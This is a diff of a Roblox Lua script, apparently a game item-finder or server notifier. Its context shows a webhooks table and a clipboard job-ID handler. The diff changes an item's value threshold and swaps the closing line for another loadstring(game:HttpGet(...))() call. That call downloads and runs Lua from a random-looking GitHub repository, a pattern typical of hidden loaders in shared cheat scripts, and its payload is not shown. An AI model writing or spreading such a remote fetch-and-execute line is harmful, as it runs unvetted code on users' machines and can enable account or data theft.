@@ -95,7 +95,7 @@ local WEBHOOKS = {
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES + MUTATIONS
 local SPECIAL_BRAINROTS = {
-    ['Dragon Cannelloni'] = { min = 999999999, mutations = {} },
+    ['Dragon Cannelloni'] = { min = 999999999999990, mutations = {} },
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -846,4 +846,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/fvddfv"))()
